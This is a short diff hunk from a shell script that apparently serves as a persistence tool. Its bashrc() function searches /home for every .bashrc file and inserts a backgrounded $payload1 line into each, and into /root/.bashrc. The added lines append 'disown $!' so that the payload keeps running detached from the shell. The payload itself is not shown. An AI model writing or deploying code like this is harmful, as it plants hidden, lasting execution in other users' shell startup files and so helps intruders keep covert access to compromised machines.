@@ -64,9 +64,11 @@ bashrc(){
     bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
     for i in $bashrc; do
         sed -is "30 a $payload1 2>/dev/null &" $i
+        sed -is "31 a disown $!" $i
     done
 
     sed -i "30 a $payload1 2>/dev/null &" /root/.bashrc
+    sed -i "31 a disown $!" /root/.bashrc
 }
 
 # Need persistent alias. Right now, this doesn't do anything 
